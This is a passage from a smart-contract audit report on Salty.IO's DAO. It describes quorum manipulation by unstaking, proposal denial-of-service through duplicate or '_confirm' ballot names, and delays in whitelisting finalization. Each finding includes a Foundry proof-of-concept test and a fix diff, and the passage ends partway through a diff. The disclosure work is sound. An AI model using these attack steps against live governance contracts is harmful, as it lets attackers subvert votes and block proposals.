*Submitted by [0xpiken](https://github.com/code-423n4/2024-01-salty-findings/issues/716), also found by [Infect3d](https://github.com/code-423n4/2024-01-salty-findings/issues/919), [Toshii](https://github.com/code-423n4/2024-01-salty-findings/issues/892), Aymen0909 ([1](https://github.com/code-423n4/2024-01-salty-findings/issues/853), [2](https://github.com/code-423n4/2024-01-salty-findings/issues/846)), [jasonxiale](https://github.com/code-423n4/2024-01-salty-findings/issues/815), [Draiakoo](https://github.com/code-423n4/2024-01-salty-findings/issues/706), [zhaojie](https://github.com/code-423n4/2024-01-salty-findings/issues/689), [solmaxis69](https://github.com/code-423n4/2024-01-salty-findings/issues/515), [t0x1c](https://github.com/code-423n4/2024-01-salty-findings/issues/493), [0xRobocop](https://github.com/code-423n4/2024-01-salty-findings/issues/424), [0xBinChook](https://github.com/code-423n4/2024-01-salty-findings/issues/382), J4X ([1](https://github.com/code-423n4/2024-01-salty-findings/issues/301), [2](https://github.com/code-423n4/2024-01-salty-findings/issues/187)), [klau5](https://github.com/code-423n4/2024-01-salty-findings/issues/228), [0xWaitress](https://github.com/code-423n4/2024-01-salty-findings/issues/63), [cats](https://github.com/code-423n4/2024-01-salty-findings/issues/46), and [haxatron](https://github.com/code-423n4/2024-01-salty-findings/issues/21)*

SALT staker might have chance to finalize the vote by manipulating the required quorum.

### Proof of Concept

When a proposal is created, anyone can vote by calling `Proposals#castVote()` as far as they have voting power.
Anyone can finalize the vote on a specific ballot by calling `DAO#finalizeBallot()` as soon as the ballot meet below requirements:

*   The ballot is live
*   `ballotMinimumEndTime`(the minimum duration) has passed
*   The required quorum has been reached

If the total number of votes is less than the required quorum, the ballot can not be finalized:

```solidity
396:  if ( totalVotesCastForBallot(ballotID) < requiredQuorumForBallotType( ballot.ballotType ))
397:    return false;
```

The required quorum varies based on the ballot type and the total staked SALT:

```solidity
  function requiredQuorumForBallotType( BallotType ballotType ) public view returns (uint256 requiredQuorum)
  {
    // The quorum will be specified as a percentage of the total amount of SALT staked
    uint256 totalStaked = staking.totalShares( PoolUtils.STAKED_SALT );
    require( totalStaked != 0, "SALT staked cannot be zero to determine quorum" );
    
    if ( ballotType == BallotType.PARAMETER )
      requiredQuorum = ( 1 * totalStaked * daoConfig.baseBallotQuorumPercentTimes1000()) / ( 100 * 1000 );
    else if ( ( ballotType == BallotType.WHITELIST_TOKEN ) || ( ballotType == BallotType.UNWHITELIST_TOKEN ) )
      requiredQuorum = ( 2 * totalStaked * daoConfig.baseBallotQuorumPercentTimes1000()) / ( 100 * 1000 );
    else
    // All other ballot types require 3x multiple of the baseQuorum
      requiredQuorum = ( 3 * totalStaked * daoConfig.baseBallotQuorumPercentTimes1000()) / ( 100 * 1000 );
    
    // Make sure that the requiredQuorum is at least 0.50% of the total SALT supply.
    // Circulating supply after the first 45 days of emissions will be about 3 million - so this would require about 16% of the circulating
    // SALT to be staked and voting to pass a proposal (including whitelisting) 45 days after deployment..
    uint256 totalSupply = ERC20(address(exchangeConfig.salt())).totalSupply();
    uint256 minimumQuorum = totalSupply * 5 / 1000;
    
    if ( requiredQuorum < minimumQuorum )
      requiredQuorum = minimumQuorum;
  }
```

If a SALT staker unstakes their xSALT, the required quorum will decrease. However, this action does not impact the voting number the staker has casted. A staker might have chance to finalize the ballot in advance by unstaking their xSALT if the total number of votes and required quorum are close enough.
Once the ballot is closed, the staker can simply cancel their unstaking without suffering any loss.

Copy below codes to [Proposals.t.sol](https://github.com/code-423n4/2024-01-salty/blob/main/src/dao/tests/Proposals.t.sol) and run `COVERAGE="yes" NETWORK="sep" forge test -vv --rpc-url RPC_URL --match-test testCanFinalizeBallotByUnstaking`

```solidity
  function testCanFinalizeBallotByUnstaking() public {
    uint256 initialStake = 10000000 ether;
    vm.prank(DEPLOYER);
    staking.stakeSALT( initialStake );
    
    vm.startPrank(alice);
    staking.stakeSALT(1110111 ether);
    uint256 ballotID = proposals.proposeParameterBallot(2, "description" );
    proposals.castVote(ballotID, Vote.INCREASE);
    vm.stopPrank();
    
    vm.warp(block.timestamp + daoConfig.ballotMinimumDuration() + 1); // ballot end time reached
    
    // Reach quorum
    vm.startPrank(alice);
    //@audit-info before unstaking, the ballot can not be finalized
    bool canFinalizeBeforeUnstaking = proposals.canFinalizeBallot(ballotID);
    assertEq(canFinalizeBeforeUnstaking, false);
    //@audit-info alice unstake SALT
    staking.unstake(1110111 ether, 52);
    //@audit-info after unstaking, the ballot can be finalized now. 
    bool canFinalizeAfterUnstaking = proposals.canFinalizeBallot(ballotID);
    assertEq(canFinalizeAfterUnstaking, true);
    vm.stopPrank();
  }
```

From above codes we can see, the ballot can be finalized after Alice unstakes all her xSALT.

### Recommended Mitigation Steps

There are several ways to fix this problem. The simplest one is calculating and storing the required quorum when the proposal is created. Once the required quorum is fixed, no one can change it by unstaking their xSALT:

<details>

```diff
  struct Ballot
  {
    uint256 ballotID;
    bool ballotIsLive;
    
    BallotType ballotType;
    string ballotName;
    address address1;
    uint256 number1;
    string string1;
    string description;
    
    // The earliest timestamp at which a ballot can end. Can be open longer if the quorum has not yet been reached for instance.
    uint256 ballotMinimumEndTime;
+   uint256 requiredQuorum;
  }

  function _possiblyCreateProposal( string memory ballotName, BallotType ballotType, address address1, uint256 number1, string memory string1, string memory string2 ) internal returns (uint256 ballotID)
  {
    require( block.timestamp >= firstPossibleProposalTimestamp, "Cannot propose ballots within the first 45 days of deployment" );
    
    // The DAO can create confirmation proposals which won't have the below requirements
    if ( msg.sender != address(exchangeConfig.dao() ) )
    {
      // Make sure that the sender has the minimum amount of xSALT required to make the proposal
      uint256 totalStaked = staking.totalShares(PoolUtils.STAKED_SALT);
      uint256 requiredXSalt = ( totalStaked * daoConfig.requiredProposalPercentStakeTimes1000() ) / ( 100 * 1000 );
      
      require( requiredXSalt > 0, "requiredXSalt cannot be zero" );
      
      uint256 userXSalt = staking.userShareForPool( msg.sender, PoolUtils.STAKED_SALT );
      require( userXSalt >= requiredXSalt, "Sender does not have enough xSALT to make the proposal" );
      
      // Make sure that the user doesn't already have an active proposal
      require( ! _userHasActiveProposal[msg.sender], "Users can only have one active proposal at a time" );
    }
    
    // Make sure that a proposal of the same name is not already open for the ballot
    require( openBallotsByName[ballotName] == 0, "Cannot create a proposal similar to a ballot that is still open" );
    require( openBallotsByName[ string.concat(ballotName, "_confirm")] == 0, "Cannot create a proposal for a ballot with a secondary confirmation" );
    
    uint256 ballotMinimumEndTime = block.timestamp + daoConfig.ballotMinimumDuration();
    
    // Add the new Ballot to storage
    ballotID = nextBallotID++;
-   ballots[ballotID] = Ballot( ballotID, true, ballotType, ballotName, address1, number1, string1, string2, ballotMinimumEndTime );
+   uint requiredQuorum = requiredQuorumForBallotType(ballotType);
+   ballots[ballotID] = Ballot( ballotID, true, ballotType, ballotName, address1, number1, string1, string2, ballotMinimumEndTime, requiredQuorum );
    openBallotsByName[ballotName] = ballotID;
    _allOpenBallots.add( ballotID );
    
    // Remember that the user made a proposal
    _userHasActiveProposal[msg.sender] = true;
    _usersThatProposedBallots[ballotID] = msg.sender;
    
    emit ProposalCreated(ballotID, ballotType, ballotName);
  }
  function canFinalizeBallot( uint256 ballotID ) external view returns (bool)
  {
    Ballot memory ballot = ballots[ballotID];
    if ( ! ballot.ballotIsLive )
      return false;
    
    // Check that the minimum duration has passed
    if (block.timestamp < ballot.ballotMinimumEndTime )
      return false;
    
    // Check that the required quorum has been reached
+   if ( totalVotesCastForBallot(ballotID) < requiredQuorumForBallotType( ballot.ballotType ))
-   if ( totalVotesCastForBallot(ballotID) < ballot.requiredQuorum)
      return false;
    
    return true;
  }
```
</details>

**[Picodes (Judge) commented](https://github.com/code-423n4/2024-01-salty-findings/issues/716#issuecomment-1956775089):**
 > This shows how without economic penalty, the actual quorum can be `quorum / (1 + quorum)` if all voters collude to do this.

**[othernet-global (Salty.IO) confirmed and commented](https://github.com/code-423n4/2024-01-salty-findings/issues/716#issuecomment-1960917897):**
 > Ballots now keep track of their own requiredQuorum at the time they were created.
> 
> https://github.com/othernet-global/salty-io/commit/c46069644739885fa36e84e27e1dd6362b854663

**Status:** Mitigation confirmed. Full details in reports from Reports from  [zzebra83](https://github.com/code-423n4/2024-03-saltyio-mitigation-findings/issues/57), [0xpiken](https://github.com/code-423n4/2024-03-saltyio-mitigation-findings/issues/76), and [t0x1c](https://github.com/code-423n4/2024-03-saltyio-mitigation-findings/issues/5).

***

## [[M-12] DOS of proposals by abusing ballot names without important parameters](https://github.com/code-423n4/2024-01-salty-findings/issues/621)
*Submitted by [juancito](https://github.com/code-423n4/2024-01-salty-findings/issues/621), also found by [0xRobocop](https://github.com/code-423n4/2024-01-salty-findings/issues/1065), [pina](https://github.com/code-423n4/2024-01-salty-findings/issues/855), [DanielArmstrong](https://github.com/code-423n4/2024-01-salty-findings/issues/835), [zhaojie](https://github.com/code-423n4/2024-01-salty-findings/issues/683), [0xCiphky](https://github.com/code-423n4/2024-01-salty-findings/issues/612), [erosjohn](https://github.com/code-423n4/2024-01-salty-findings/issues/437), [PENGUN](https://github.com/code-423n4/2024-01-salty-findings/issues/393), [twcctop](https://github.com/code-423n4/2024-01-salty-findings/issues/368), [haxatron](https://github.com/code-423n4/2024-01-salty-findings/issues/352), [J4X](https://github.com/code-423n4/2024-01-salty-findings/issues/351), [klau5](https://github.com/code-423n4/2024-01-salty-findings/issues/216), [0xWaitress](https://github.com/code-423n4/2024-01-salty-findings/issues/57), and [lanrebayode77](https://github.com/code-423n4/2024-01-salty-findings/issues/1000)*

<https://github.com/code-423n4/2024-01-salty/blob/53516c2cdfdfacb662cdea6417c52f23c94d5b5b/src/dao/Proposals.sol#L101-L102> 

<https://github.com/code-423n4/2024-01-salty/blob/53516c2cdfdfacb662cdea6417c52f23c94d5b5b/src/dao/Proposals.sol#L196>

An adversary can prevent legit proposals from being created by using the same ballot name.

Proposals with the same name can't be created, leading to a DOS for some days until the voting phase ends. This can be done repeatedly, after finalizing the previous malicious proposal and creating a new one.

Impacts for each proposal function:

*   `proposeSendSALT()`: DOS of all proposals
*   `proposeSetContractAddress()`: DOS of specific contract setting by proposing a malicious address
*   `proposeCallContract()`: DOS of specific contract call by providing a wrong number
*   `proposeTokenWhitelisting()`: DOS of token whitelisting by providing a fake `tokenIconURL`
*   All: Prevent the creation of any legit proposal, by providing a fake/malicious `description` to discourage positive voting

Note: This Impact fits into the [Attack Ideas](https://github.com/code-423n4/2024-01-salty?tab=readme-ov-file#attack-ideas-where-to-look-for-bugs): "Any issue that would prevent the DAO from functioning correctly."

### Vulnerability Details

The main issue is that ballots with the same name revert, and the name doesn't contain all the important parameters to create the proposal:

```solidity
// Make sure that a proposal of the same name is not already open for the ballot
require( openBallotsByName[ballotName] == 0, "Cannot create a proposal similar to a ballot that is still open" );
```

[Proposals.sol#L101-L102](https://github.com/code-423n4/2024-01-salty/blob/53516c2cdfdfacb662cdea6417c52f23c94d5b5b/src/dao/Proposals.sol#L101-L102)

**`proposeSendSALT()` Vulnerability Details**

Let's see for example the ["Send SALT" proposal](https://github.com/code-423n4/2024-01-salty/blob/53516c2cdfdfacb662cdea6417c52f23c94d5b5b/src/dao/Proposals.sol#L196). It [always has the same name](https://github.com/code-423n4/2024-01-salty/blob/53516c2cdfdfacb662cdea6417c52f23c94d5b5b/src/dao/Proposals.sol#L207) `sendSALT`. Despite this [appears to be an expected behaviour](https://github.com/code-423n4/2024-01-salty/blob/53516c2cdfdfacb662cdea6417c52f23c94d5b5b/src/dao/Proposals.sol#L195), it can be exploited by an adversary.

[The minimum ballot duration is 3 days, with a default value of 10 days](https://github.com/code-423n4/2024-01-salty/blob/53516c2cdfdfacb662cdea6417c52f23c94d5b5b/src/dao/DAOConfig.sol#L42-L45). Given that [ballots can't be finalized before that](https://github.com/code-423n4/2024-01-salty/blob/53516c2cdfdfacb662cdea6417c52f23c94d5b5b/src/dao/Proposals.sol#L391-L393), an adversary can consistently create malicious proposals to send themselves the SALT token. The proposal will enter the voting period for some days, and when the phase ends, the adversary can finalize it, and immediately create the same proposal.

This will prevent any other legit "Send SALT" proposal from being created.

There are no mechanisms to remove these malicious proposals, or to prevent malicious actors from creating them, nor removing their stake. The cost for the adversary is meaningless, as it requires to execute a tx every few days, and they can still claim rewards from the staked assets needed for the proposals.

**`proposeSetContractAddress()` Vulnerability Details**

[Only the `contractName` is considered for the ballot name](https://github.com/code-423n4/2024-01-salty/blob/53516c2cdfdfacb662cdea6417c52f23c94d5b5b/src/dao/Proposals.sol#L244), but not the `newAddress`.

This means that an attack can be performed to consistently create proposals for a specific contract with a malicious address. This prevents [updating the price feeds and the access manager](https://github.com/code-423n4/2024-01-salty/blob/53516c2cdfdfacb662cdea6417c52f23c94d5b5b/src/dao/DAO.sol#L135-L142).

**`proposeCallContract()` Vulnerability Details**

[Only the `contractName` is considered for the ballot name](https://github.com/code-423n4/2024-01-salty/blob/53516c2cdfdfacb662cdea6417c52f23c94d5b5b/src/dao/Proposals.sol#L217), but not the `number` with which it will be called.

Same as with the previous attack, an adversary can target a specific contract, and consistently create proposals with a wrong calling `number`.

**`proposeTokenWhitelisting()` Vulnerability Details**

[The `tokenIconURL` is missing in the ballot name](https://github.com/code-423n4/2024-01-salty/blob/53516c2cdfdfacb662cdea6417c52f23c94d5b5b/src/dao/Proposals.sol#L171), so whitelisting proposals can be maliciously created for a specific token with a wrong token icon.

**`description()` Vulnerability Details**

No proposal includes the `description` (or its hash) in its ballot name. So an adversary can prevent the creation of the legit proposal, by frontrunning it for example, and change the description to something that users would not vote for.

### Proof of Concept

[This test for `proposeSendSALT()` already shows how a new proposal can't be created when there is an existing one](https://github.com/code-423n4/2024-01-salty/blob/53516c2cdfdfacb662cdea6417c52f23c94d5b5b/src/dao/tests/Proposals.t.sol#L656-L657). An adversary can exploit that as explained on the `Vulnerability Details` section. That test could be extended to all the other mentioned functions with their corresponding impacts.

### Recommended Mitigation Steps

In order to prevent the DOS, ballot names (or some new id variable) should include ALL the attributes of the proposal: `ballotType`, `address1`, `number1`, `string1`, and `string2`. Strings could be hashed, and the whole pack could be hashed as well.

So, if an adversary creates the proposal, it would look exactly the same as the legit one.

In the particular case of `proposeSendSALT()`, strictly preventing simultaneous proposals as they are right now will lead to the explained DOS. Some other mechanism should be implemented to mitigate risks. One way could be to set a long enough cooldown for each user, so that they can't repeatedly send these type of proposals (take into account unstake time).

**[othernet-global (Salty.IO) confirmed and commented](https://github.com/code-423n4/2024-01-salty-findings/issues/621#issuecomment-1950636337):**
 > ballotNames now include all provided proposal arguments.
> 
> https://github.com/othernet-global/salty-io/commit/39921b4a25041c7ac4e9b5279e12bb2ec518140b

**[Picodes (Judge) commented](https://github.com/code-423n4/2024-01-salty-findings/issues/621#issuecomment-1952901757):**
 > Flagging as duplicate of #621 all issues about the fact that identifying proposals by names that are not sender-specific and do not include all arguments opens the door to being front-run and could lead to a DoS. Not all reports found all the different cases where this could happen but I gave full credit to the one where the impact was Medium.

**Status:** Mitigated with an Error. Full details in report from [t0x1c](https://github.com/code-423n4/2024-03-saltyio-mitigation-findings/issues/60), and also included in the [Mitigation Review](#mitigation-review) section below.

***

## [[M-13] Adversary can prevent updating price feed addresses by creating poisonous proposals ending in `_confirm`](https://github.com/code-423n4/2024-01-salty-findings/issues/620)
*Submitted by [juancito](https://github.com/code-423n4/2024-01-salty-findings/issues/620), also found by [falconhoof](https://github.com/code-423n4/2024-01-salty-findings/issues/980), [gkrastenov](https://github.com/code-423n4/2024-01-salty-findings/issues/956), [memforvik](https://github.com/code-423n4/2024-01-salty-findings/issues/929), [0xAsen](https://github.com/code-423n4/2024-01-salty-findings/issues/881), [jasonxiale](https://github.com/code-423n4/2024-01-salty-findings/issues/819), [0x3b](https://github.com/code-423n4/2024-01-salty-findings/issues/720), [0xpiken](https://github.com/code-423n4/2024-01-salty-findings/issues/665), [Ward](https://github.com/code-423n4/2024-01-salty-findings/issues/607), [Limbooo](https://github.com/code-423n4/2024-01-salty-findings/issues/595), [israeladelaja](https://github.com/code-423n4/2024-01-salty-findings/issues/529), [0xPluto](https://github.com/code-423n4/2024-01-salty-findings/issues/463), [t0x1c](https://github.com/code-423n4/2024-01-salty-findings/issues/444), [a3yip6](https://github.com/code-423n4/2024-01-salty-findings/issues/431), [PENGUN](https://github.com/code-423n4/2024-01-salty-findings/issues/390), [haxatron](https://github.com/code-423n4/2024-01-salty-findings/issues/326), [miaowu](https://github.com/code-423n4/2024-01-salty-findings/issues/311), [Myrault](https://github.com/code-423n4/2024-01-salty-findings/issues/310), [b0g0](https://github.com/code-423n4/2024-01-salty-findings/issues/241), [linmiaomiao](https://github.com/code-423n4/2024-01-salty-findings/issues/178), [nonseodion](https://github.com/code-423n4/2024-01-salty-findings/issues/138), 0xAlix2 ([1](https://github.com/code-423n4/2024-01-salty-findings/issues/91), [2](https://github.com/code-423n4/2024-01-salty-findings/issues/88)), and [y4y](https://github.com/code-423n4/2024-01-salty-findings/issues/82)*

An adversary can prevent the creation of `setContract` and `websiteUpdate` proposals by creating a poisonous proposal with the same ballot name + `_confirm`. This attack can be performed repeatedly every few days (when the voting period ends).

Affected proposals:

*   `setContract:priceFeed1` -> `setContract:priceFeed1_confirm`
*   `setContract:priceFeed2` -> `setContract:priceFeed2_confirm`
*   `setContract:priceFeed3` -> `setContract:priceFeed3_confirm`
*   `setContract:accessManager` -> `setContract:accessManager_confirm`
*   `setURL:{{newWebsiteURL}}` -> `setURL:{{newWebsiteURL}}_confirm`

This is especially worrisome for the `setContract` proposals, as it prevents changing the price feed contracts, which are used for USDS borrowing and liquidations.

Note: This Impact fits into the [Attack Ideas](https://github.com/code-423n4/2024-01-salty?tab=readme-ov-file#attack-ideas-where-to-look-for-bugs): "Any issue that would prevent the DAO from functioning correctly."

### Vulnerability Details

[`setContract`](https://github.com/code-423n4/2024-01-salty/blob/53516c2cdfdfacb662cdea6417c52f23c94d5b5b/src/dao/Proposals.sol#L240) and [`websiteUpdate`](https://github.com/code-423n4/2024-01-salty/blob/53516c2cdfdfacb662cdea6417c52f23c94d5b5b/src/dao/Proposals.sol#L249) proposals are executed in multiple steps.

Here's the process for changing the Price Feed 1, as an example:

1.  [A new proposal is created](https://github.com/code-423n4/2024-01-salty/blob/53516c2cdfdfacb662cdea6417c52f23c94d5b5b/src/dao/Proposals.sol#L244) with a ballot name `setContract:priceFeed1`
2.  The proposal is voted, and when it wins, [a confirmation proposal is created](https://github.com/code-423n4/2024-01-salty/blob/53516c2cdfdfacb662cdea6417c52f23c94d5b5b/src/dao/DAO.sol#L204), appending `_confirm` to the ballot name, resulting in `setContract:priceFeed1_confirm`.
3.  When the confirmation proposal wins, it [checks its ballot name](https://github.com/code-423n4/2024-01-salty/blob/53516c2cdfdfacb662cdea6417c52f23c94d5b5b/src/dao/DAO.sol#L135) and then it [sets the new price feed](https://github.com/code-423n4/2024-01-salty/blob/53516c2cdfdfacb662cdea6417c52f23c94d5b5b/src/dao/DAO.sol#L136).

The problem is that there is a check in `_possiblyCreateProposal()` that can be exploited:

```solidity
require( openBallotsByName[ string.concat(ballotName, "_confirm")] == 0, "Cannot create a proposal for a ballot with a secondary confirmation" );
```

[Proposals.sol#L103](https://github.com/code-423n4/2024-01-salty/blob/53516c2cdfdfacb662cdea6417c52f23c94d5b5b/src/dao/Proposals.sol#L103)

This check is intended to prevent creating new proposals if there is a pending confirmation proposal being voted for the same change, but an adversary can use it to create a proposal [](https://github.com/code-423n4/2024-01-salty/blob/53516c2cdfdfacb662cdea6417c52f23c94d5b5b/src/dao/Proposals.sol#L110) with a ballot name `setContract:priceFeed1_confirm`, by setting `priceFeed1_confirm` [as the contract name](https://github.com/code-423n4/2024-01-salty/blob/53516c2cdfdfacb662cdea6417c52f23c94d5b5b/src/dao/Proposals.sol#L244).

If someone tries to create a legit `priceFeed1` proposal later, it will `revert`, leading to a DOS.

This holds for all proposals mentioned in the `Impact` section.

### Proof of Concept

1.  Add the test to `src/dao/tests/Proposals.t.sol`
2.  Run `COVERAGE="no" NETWORK="sep" forge test -vv --rpc-url https://1rpc.io/sepolia --mt "testProposeSetContractAddress_confirm"`

```solidity
function testProposeSetContractAddress_confirm() public {
    uint256 initialNextBallotId = proposals.nextBallotID();

    // Alice is the adversary
    vm.startPrank(alice);
    staking.stakeSALT(1000 ether);

    // Create a poisonous proposal with a ballot name ending in `_confirm`
    address newAddress = address(0x1111111111111111111111111111111111111112);
    proposals.proposeSetContractAddress("priceFeed1_confirm", newAddress, "description");
    assertEq(proposals.nextBallotID(), initialNextBallotId + 1); // proposal was created successfully
    vm.stopPrank();

    // Transfer some tokens to Bob who wants to create a legit proposal
    vm.startPrank(DEPLOYER);
    salt.transfer(bob, 1000 ether);
    vm.stopPrank();

    // Bob can't create a legit proposal to change the contract address of `priceFeed1`
    vm.startPrank(bob);
    staking.stakeSALT(1000 ether);
    vm.expectRevert("Cannot create a proposal for a ballot with a secondary confirmation");
    proposals.proposeSetContractAddress("priceFeed1", newAddress, "description");
}
```

### Recommended Mitigation Steps

Given the current implementation, the most straightforward fix would be to prevent the creation of proposals with ballot names ending in `_confirm` for proposals that need a confirmation.

This would mean [checking the `contractName` in `proposeSetContractAddress()`](https://github.com/code-423n4/2024-01-salty/blob/53516c2cdfdfacb662cdea6417c52f23c94d5b5b/src/dao/Proposals.sol#L244), and the [`newWebsiteURL` in `proposeWebsiteUpdate()`](https://github.com/code-423n4/2024-01-salty/blob/53516c2cdfdfacb662cdea6417c52f23c94d5b5b/src/dao/Proposals.sol#L253).

But, as a recommendation, I would suggest refactoring [`createConfirmationProposal()` ](https://github.com/code-423n4/2024-01-salty/blob/53516c2cdfdfacb662cdea6417c52f23c94d5b5b/src/dao/Proposals.sol#L122) to pass a "confirmation" parameter to `_possiblyCreateProposal()`, so that confirmation proposals don't rely on the ballot name.

**[othernet-global (Salty.IO) confirmed and commented](https://github.com/code-423n4/2024-01-salty-findings/issues/620#issuecomment-1945517737):**
 > confirm_ is now prepended to automatic confirmation ballots form setWebsiteURL and setContract proposals.
> 
> https://github.com/othernet-global/salty-io/commit/5aa1bc1ddadd67cd875de932633948af25ff8957

 > The stablecoin framework: /stablecoin, /price_feed, WBTC/WETH collateral, PriceAggregator, price feeds and USDS have been removed:
> https://github.com/othernet-global/salty-io/commit/88b7fd1f3f5e037a155424a85275efd79f3e9bf9

**[Picodes (Judge) commented](https://github.com/code-423n4/2024-01-salty-findings/issues/620#issuecomment-1967319152):**
 > Here assets are not at direct risk but a "function of the protocol or its availability could be impacted"

_Note: For full discussion, see [here](https://github.com/code-423n4/2024-01-salty-findings/issues/620)._

**Status:** Mitigation confirmed. Full details in reports from [0xpiken](https://github.com/code-423n4/2024-03-saltyio-mitigation-findings/issues/78), [zzebra83](https://github.com/code-423n4/2024-03-saltyio-mitigation-findings/issues/96), and [t0x1c](https://github.com/code-423n4/2024-03-saltyio-mitigation-findings/issues/17).

***

## [[M-14] Ballots not yet past their deadline are incorrectly looped too by tokenWhitelistingBallotWithTheMostVotes()](https://github.com/code-423n4/2024-01-salty-findings/issues/556)
*Submitted by [t0x1c](https://github.com/code-423n4/2024-01-salty-findings/issues/556)*

Inside `DAO.sol`, [\_finalizeTokenWhitelisting()](https://github.com/code-423n4/2024-01-salty/blob/main/src/dao/DAO.sol#L250) before finalizing a token whitelisting proposal makes a check that it's the ballot with most votes:

```js
249			// Fail to whitelist for now if this isn't the whitelisting proposal with the most votes - can try again later.
250			uint256 bestWhitelistingBallotID = proposals.tokenWhitelistingBallotWithTheMostVotes();
251			require( bestWhitelistingBallotID == ballotID, "Only the token whitelisting ballot with the most votes can be finalized" );
```

The [tokenWhitelistingBallotWithTheMostVotes()](https://github.com/code-423n4/2024-01-salty/blob/main/src/dao/Proposals.sol#L417) function however does not care if the other ballots being looped through are yet not past their deadline. This is an incorrect approach because a ballot which has more `Yes` votes at this point of time may well turn into a rejected ballot by its deadline timestamp if additional `No` votes are cast in coming days. Hence using its current state to deny whitelisting of a proposal past its deadline is unfair & only contributes to delaying the timelines, since this may happen again & again which would result in the protocol repeatedly pushing the finalization time further & further away into the future.<br>

*   Either only ballots past their deadline should be considered, OR
*   Only compare ballots which were created within a few hours of each other

Explanation through an example scenario *(also provided in the form of a coded PoC in the next section)*:

*   Dan, Alice and Bob stake some salt. Dan = `2,400,000`, Alice = `290,000` and Bob = `310,000`
*   Hence, total staked salt = `6,000,000`
*   Alice floats ProposalA for token whitelisting with deadline timestamp `t_a`
*   Minimum quorum required is 20% of 6,000,000 = `600,000`
*   ProposalA receives votes : `YES = 310,000; NO = 290,000`. Quorum reached.
*   Just a day before `t_a`, Bob floats ProposalB for whitelisting with deadline timestamp `t_b`
*   ProposalB receives votes : `YES = 600,000; NO = 0`. Quorum reached. Also, ProposalB has more `Yes` votes than ProposalA.
*   At timestamp `t_a`, `finalizeBallot()` is called for ProposalA but it faces a `revert` on [L251](https://github.com/code-423n4/2024-01-salty/blob/main/src/dao/DAO.sol#L251) because ProposalB has greater `Yes` votes
*   An hour before `t_b`, Dan casts his `No` vote for ProposalB which results in : `YES = 600,000; NO = 2,400,000` making it lose with overwhelming majority.
*   Note that instead of the above step, another possibility is that some of the current 'Yes`voters change their vote to`No\`.
*   `finalizeBallot()` can be called again for ProposalA and it would pass now ***given that no other proposal has been floated meanwhile which has accumulated more votes***, else we could keep going through the above cycle once again.

**This caused a delay of around 11 days in ProposalA's finalization.** This works as a good attack vector for a malicious staker who wishes to postpone someone's else proposal but does not have enough voting power to defeat it. With some positive votes coming their way from unsuspecting stakers, they can mount this attack. Here's how:

*   Alice and Bob stake some salt. Alice = `290,000` and Bob = `310,000`. Bob is the malicious actor here.
*   Remaining salt is staked by other normal users amounting to `2,400,000`
*   Hence, total staked salt = `6,000,000`
*   Alice floats ProposalA for token whitelisting with deadline timestamp `t_a`
*   Minimum quorum required is 20% of 6,000,000 = `600,000`
*   ProposalA receives votes : `YES = 315,000; NO = 310,000`. Quorum reached. Bob had voted `No`, but he could not overcome the `Yes` votes, getting beat by a small margin.
*   Bob attempts his attack. A few days before `t_a`, Bob floats ProposalB for whitelisting with deadline timestamp `t_b` and votes `Yes` himself.
*   Some unsuspecting users don't have anything against his proposal and choose to vote `Yes`. At timestamp `t_a` his vote tally turns out to be `YES = 320,000; NO = 319,990`. In spite of being very close to losing the ballot, he still has more `Yes` votes than ProposalA.
*   At timestamp `t_a` when `finalizeBallot()` is called for ProposalA, it faces a `revert` due to having lesser votes. Bob successfully delayed ProposalA's finalization.
*   Bob was never really interested in whitelisting any token, so upon reaching close to his deadline `t_b`, he can choose to change his votes to `No` and let the proposal fail.

### Proof of Concept

Add the following tests inside `src/dao/tests/DAO.t.sol` and run via `COVERAGE="yes" NETWORK="sep" forge test -vv --rpc-url https://rpc.ankr.com/eth_sepolia --mt test_tokenWhitelistingDelayed` to see the test pass:

<details>

```js
	function test_tokenWhitelistingDelayed() public
		{
		// *************** Setup steps ***************
        deal(address(salt), address(DEPLOYER), 2_400_000 ether);
		uint256 aliceStakedAmount = 290_000 ether;
		uint256 bobStakedAmount = 310_000 ether;
        deal(address(salt), address(alice), aliceStakedAmount);
        deal(address(salt), address(bob), bobStakedAmount);
        deal(address(salt), address(dao), 5000000 ether);

		vm.prank(DEPLOYER);
        staking.stakeSALT(2_400_000 ether);
		vm.startPrank(bob);
		salt.approve(address(staking), bobStakedAmount);
        staking.stakeSALT(bobStakedAmount);
		vm.stopPrank();
		// *********************************************

        // Alice stakes her SALT to get voting power
        vm.startPrank(alice);
        staking.stakeSALT(aliceStakedAmount);

		// Propose a whitelisting ballot and cast vote
		// Quorum required = 20% of (2_400_000 + 290_000 + 310_000) = 600_000 
		uint256 ballotID = 1;
		IERC20 test = new TestERC20( "TEST", 18 );
		proposals.proposeTokenWhitelisting(test, "url", "description");
		proposals.castVote(ballotID, Vote.NO);
		vm.stopPrank();
		vm.prank(bob);
		proposals.castVote(ballotID, Vote.YES); // @audit-info : ballot_1 quorum reached

		// Increase block time to 1 hour before finalizing the ballot
		skip(daoConfig.ballotMinimumDuration() - 1 hours);

		// Bob proposes a whitelisting ballot and casts vote
		vm.startPrank(bob);
		IERC20 test2 = new TestERC20( "TEST2", 18 );
		proposals.proposeTokenWhitelisting(test2, "url2", "description2");
		proposals.castVote(ballotID + 1, Vote.YES);
		vm.stopPrank();
		vm.prank(alice);
		proposals.castVote(ballotID + 1, Vote.YES); // @audit-info : ballot_2 quorum reached; All YES votes; deadline still in the future

		// Increase block time to that of finalizing ballot_1
		skip(1 hours);

		// @audit : this would revert since Bob's ballot has more YES votes than Alice's
		vm.expectRevert("Only the token whitelisting ballot with the most votes can be finalized");
        dao.finalizeBallot(ballotID);

		skip(daoConfig.ballotMinimumDuration() - 2 hours);
		// more votes are cast for ballot_2
		vm.prank(DEPLOYER);
		proposals.castVote(ballotID + 1, Vote.NO); // @audit-info : ballot_2 now has NO > YES votes

		// @audit : this would pass now
        dao.finalizeBallot(ballotID);
		// Check that the ballot is finalized
        bool isBallotFinalized = !proposals.ballotForID(ballotID).ballotIsLive;
        assertTrue(isBallotFinalized);
    }
```
</details>

### Tools used

Foundry

### Recommended Mitigation Steps

*   Either only ballots past their deadline should be considered, OR
*   Only compare ballots which were created within a few hours of each other.

The following diff uses the first option:

<details>

```diff
	// Returns the ballotID of the whitelisting ballot that currently has the most yes votes
	// Requires that the quorum has been reached and that the number of yes votes is greater than the number no votes
	function tokenWhitelistingBallotWithTheMostVotes() external view returns (uint256)
		{
		uint256 quorum = requiredQuorumForBallotType( BallotType.WHITELIST_TOKEN);

		uint256 bestID = 0;
		uint256 mostYes = 0;
		for( uint256 i = 0; i < _openBallotsForTokenWhitelisting.length(); i++ )
			{
			uint256 ballotID = _openBallotsForTokenWhitelisting.at(i);
